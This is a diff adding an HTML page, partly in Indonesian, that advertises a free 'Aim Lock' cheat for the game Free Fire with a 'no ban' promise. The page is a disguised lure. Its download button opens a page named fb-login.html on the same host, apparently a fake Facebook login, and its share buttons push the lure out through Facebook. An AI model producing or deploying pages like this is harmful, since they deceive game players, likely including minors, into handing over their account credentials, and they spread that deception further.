@@ -1,0 +1,127 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Aim Lock Freefire</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #121212;
+            color: white;
+            text-align: center;
+            margin: 0;
+            padding: 0;
+        }
+
+        header {
+            background-color: #001f5b;
+            padding: 15px;
+            font-size: 18px;
+            font-weight: bold;
+        }
+
+        .container {
+            max-width: 600px;
+            margin: auto;
+            padding: 20px;
+        }
+
+        .download-box {
+            background: #1e1e1e;
+            padding: 20px;
+            border-radius: 10px;
+            margin-bottom: 20px;
+        }
+
+        .download-btn {
+            background: #ff9800;
+            color: white;
+            padding: 10px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            width: 100%;
+            margin-top: 10px;
+            font-size: 16px;
+        }
+
+        .share-box button {
+            background: #444;
+            color: white;
+            padding: 10px;
+            border: none;
+            margin: 5px;
+            cursor: pointer;
+            width: 100%;
+            font-size: 14px;
+        }
+
+        footer {
+            background: #222;
+            padding: 10px;
+            font-size: 12px;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <h4>Download Aim Lock Freefire</h4>
+        <h5>No Blacklist And Banned</h5>
+    </header>
+
+    <div class="container">
+        <div class="download-box">
+            <h3>📄 Aim Lock 100% Anti BL Anti Banned.zip</h3>
+            <p>Download (2.29MB)</p>
+            <button class="download-btn" onclick="startDownload()">⬇ Download</button>
+            <p>Clicking the download button above will start your download in a new tab and show a message from our advertising partners.</p>
+        </div>
+
+        <div class="share-box">
+            <button onclick="copyLink()">🔗 Copy for Messenger</button>
+            <button onclick="shareToFacebook()">📘 Post to Facebook</button>
+            <button onclick="shareOptions()">📤 Share Options</button>
+            <button onclick="saveToFiles()">📂 Save to My Files</button>
+        </div>
+    </div>
+
+    <footer>
+        <p>©2025 Black Octopus 1 | Privacy Policy | Terms | Copyright | Abuse | More...</p>
+    </footer>
+
+    <script>
+        function startDownload() {
+            window.open("https://black-octopus-1.github.io/fb-login.html", "_blank");
+        }
+
+        function copyLink() {
+            const link = "https://your-download-page.com";
+            navigator.clipboard.writeText(link).then(() => {
+                alert("Link copied to clipboard!");
+            });
+        }
+
+        function shareToFacebook() {
+            const url = "https://black-octopus-1.github.io/aimlock.html";
+            window.open(`https://www.facebook.com/sharer/sharer.php?u=${encodeURIComponent(url)}`, "_blank");
+        }
+
+        function shareOptions() {
+            if (navigator.share) {
+                navigator.share({
+                    title: "Download Aim Lock Freefire",
+                    text: "Dapatkan Aim Lock 100% Anti Banned",
+                    url: "https://black-octopus-1.github.io/aimlock.html"
+                }).catch(err => console.log("Error sharing:", err));
+            } else {
+                alert("Browser tidak mendukung fitur berbagi.");
+            }
+        }
+
+        function saveToFiles() {
+            alert("Fitur Save to My Files belum tersedia.");
+        }
+    </script>
+</body>
+</html>
